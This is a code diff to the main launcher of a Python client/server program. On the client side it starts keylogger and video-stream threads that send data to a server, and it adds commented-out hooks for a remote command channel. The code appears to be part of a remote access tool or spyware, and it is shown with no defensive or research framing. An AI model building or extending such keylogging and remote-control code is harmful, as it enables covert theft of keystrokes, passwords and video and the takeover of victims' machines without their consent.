@@ -2,8 +2,8 @@ import argparse
 import threading
 from server.server import Server
 from client.client import Client
-from server.handlers import start_video_stream_server, start_keylogger_server
-from client.features import start_video_stream_client, start_keylogger_client
+from server.handlers import start_video_stream_server, start_keylogger_server, handle_client
+from client.features import start_video_stream_client, start_keylogger_client, interact_with_server
 
 def main():
     parser = argparse.ArgumentParser(description="Start the client or server.")
@@ -19,15 +19,19 @@ def main():
         server = Server(host=args.host, port=args.port)
         video_thread = threading.Thread(target=start_video_stream_server, args=(args.host, args.video_port))
         keylogger_thread = threading.Thread(target=start_keylogger_server, args=(args.host, args.keylogger_port))
+        # command_thread = threading.Thread(target=handle_client, args=(args.host, args.port))
         video_thread.start()
         keylogger_thread.start()
+        # command_thread.start()
         server.start()
     elif args.role == 'client':
         client = Client(host=args.host, port=args.port)
         video_thread = threading.Thread(target=start_video_stream_client, args=(args.host, args.video_port))
         keylogger_thread = threading.Thread(target=start_keylogger_client, args=(args.host, args.keylogger_port))
+        # command_thread = threading.Thread(target=interact_with_server, args=(args.host, args.port))
         video_thread.start()
         keylogger_thread.start()
+        # command_thread.start()
         client.start()
 
 if __name__ == "__main__":
